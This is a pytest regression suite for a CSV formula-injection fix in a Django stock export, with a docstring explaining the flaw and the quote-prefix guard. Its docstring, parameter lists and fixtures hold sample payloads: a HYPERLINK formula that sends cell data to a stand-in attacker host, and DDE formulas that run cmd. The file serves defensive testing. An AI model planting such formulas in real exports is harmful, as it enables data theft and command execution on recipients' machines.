"""
Regression tests for CSV formula injection (CWE-1236) in the RM stock
snapshot export, found during the 2026-09-15 audit pass.

THE GAP
-------
`make_export_stock_snapshots()` wrote every text column - material
description, category, sub-category, vendor, UOM - into the CSV verbatim.
Those strings come from Google Drive spreadsheets that plant staff edit by
hand, so their content is genuinely outside this app's control. A cell whose
text starts `=`, `+`, `-` or `@` is evaluated as a FORMULA by Excel /
LibreOffice / Sheets the moment the downloaded file is opened:

    =HYPERLINK("http://attacker.example/?d="&A1,"Open me")   -> exfiltrates
    =cmd|'/c calc.exe'!A0                                     -> DDE exec prompt

Since the entire purpose of this export is "open this in Excel", the payload
reaches its execution context by design. Nothing in the codebase guarded
against it (confirmed by grep for any prefix/sanitize helper: there was none).

THE FIX
-------
`csv_safe()` prefixes a single quote, which spreadsheet software consumes as
"the rest of this cell is literal text". Applied through `SafeCsvWriter`, a
csv.writer wrapper, so the guard cannot be forgotten on a column added later.

WHAT THESE TESTS LOCK IN
------------------------
Both halves matter and are tested separately: that dangerous values ARE
neutralized, and that ordinary values are NOT mangled. A guard that quotes
every cell would "pass" a naive injection test while quietly turning every
numeric column in the export into text Excel refuses to sum - so the
negative cases below are load-bearing, not padding.
"""

import csv
import datetime
import io

import pytest
from rest_framework.test import APIClient

from apps.api.routers._domestic_base import SafeCsvWriter, csv_safe
from apps.api.tests.factories import make_user
from apps.core.models import HRSRMLot, HRSRMSnapshot

EXPORT_URL = "/api/stock-snapshots/export"


class TestCsvSafeUnit:
    """Pure-function tests - no DB, no HTTP."""

    @pytest.mark.parametrize("payload", [
        '=HYPERLINK("http://attacker.example","x")',
        '=cmd|\'/c calc.exe\'!A0',
        '+1+1',
        '-2+3+cmd|\' /c calc\'!A0',
        '@SUM(1+1)*cmd|\'/c calc\'!A0',
        '\t=1+1',   # Excel strips leading whitespace before deciding
        '\r=1+1',
    ])
    def test_dangerous_prefixes_are_neutralized(self, payload):
        out = csv_safe(payload)
        assert out.startswith("'"), f"{payload!r} was not neutralized"
        assert out == "'" + payload, "the original value must be preserved after the quote"

    @pytest.mark.parametrize("ordinary", [
        "ALUMINIUM TRIHYDRATE 4600N",
        "Rubamin Private Limited - Vadodara",   # internal hyphen is fine
        "KG",
        "",
        "Material (Grade A)",
    ])
    def test_ordinary_text_is_untouched(self, ordinary):
        assert csv_safe(ordinary) == ordinary

    @pytest.mark.parametrize("value", [
        None, 0, 42, -17, 3.5, True, False,
        datetime.date(2026, 9, 15),
    ])
    def test_non_strings_pass_through_unchanged(self, value):
        """Critically includes NEGATIVE NUMBERS. A guard that stringified and
        quoted these would make every negative quantity in the export text
        rather than a number, breaking sums in the recipient's spreadsheet -
        a real cost, paid for no security benefit (a Decimal cannot carry a
        formula)."""
        assert csv_safe(value) is value

    def test_negative_decimal_is_not_quoted(self):
        from decimal import Decimal
        assert csv_safe(Decimal("-12.50")) == Decimal("-12.50")

    def test_safe_writer_guards_every_column(self):
        buf = io.StringIO()
        writer = SafeCsvWriter(buf)
        writer.writerow(["=BAD()", "ok", "@ALSO_BAD", 5])
        row = next(csv.reader(io.StringIO(buf.getvalue())))
        assert row[0] == "'=BAD()"
        assert row[1] == "ok"
        assert row[2] == "'@ALSO_BAD"
        assert row[3] == "5"


@pytest.mark.django_db
class TestExportEndpointIsGuarded:
    """End-to-end through the real endpoint - proves the guard is actually
    wired in, not merely defined."""

    def setup_method(self):
        self.client = APIClient()
        self.client.force_authenticate(user=make_user(role="admin"))

    def _export_rows(self):
        resp = self.client.get(EXPORT_URL)
        assert resp.status_code == 200
        # StreamingHttpResponse: `.content` does not exist, by design - see
        # the export view's own comment on why it streams.
        body = b"".join(resp.streaming_content).decode("utf-8")
        return list(csv.reader(io.StringIO(body)))

    def test_a_malicious_material_description_is_neutralized_in_the_download(self):
        lot = HRSRMLot.objects.create(
            source_row_ref="row-injection-1",
            description='=HYPERLINK("http://attacker.example/?x="&A1,"Click")',
            category="@SUM(A1:A9)",
            party_name="=cmd|'/c calc'!A0",
            basic_rate="10.00",
        )
        HRSRMSnapshot.objects.create(
            stock_lot=lot,
            snapshot_date=datetime.date(2026, 9, 15),
            opening_stock="0", received="0", issued="0", todays_stock="5", value="50.00",
        )

        rows = self._export_rows()
        data_rows = [r for r in rows[1:] if r]
        assert data_rows, "export produced no data rows"
        row = data_rows[0]

        for cell in row:
            assert not cell.startswith(("=", "+", "@")), (
                f"cell {cell!r} would be executed as a formula by Excel"
            )
        # A leading '-' is only dangerous unquoted; confirm the ones we planted
        # specifically came through quoted and intact.
        joined = ",".join(row)
        assert "'=HYPERLINK" in joined
        assert "'@SUM" in joined
        assert "'=cmd|" in joined

    def test_ordinary_rows_export_unchanged(self):
        """The guard must not add stray quotes to normal data - otherwise
        every export becomes visibly mangled for the 99.9% ordinary case."""
        lot = HRSRMLot.objects.create(
            source_row_ref="row-ordinary-1",
            description="ALUMINIUM TRIHYDRATE 4600N",
            category="Chemicals",
            party_name="Rubamin Private Limited",
            basic_rate="10.00",
        )
        HRSRMSnapshot.objects.create(
            stock_lot=lot,
            snapshot_date=datetime.date(2026, 9, 15),
            opening_stock="0", received="0", issued="0", todays_stock="5", value="50.00",
        )

        data_rows = [r for r in self._export_rows()[1:] if r]
        row = data_rows[0]
        assert "ALUMINIUM TRIHYDRATE 4600N" in row
        assert "Chemicals" in row
        assert "Rubamin Private Limited" in row
        assert not any(cell.startswith("'") for cell in row), (
            "ordinary values must not be quoted"
        )
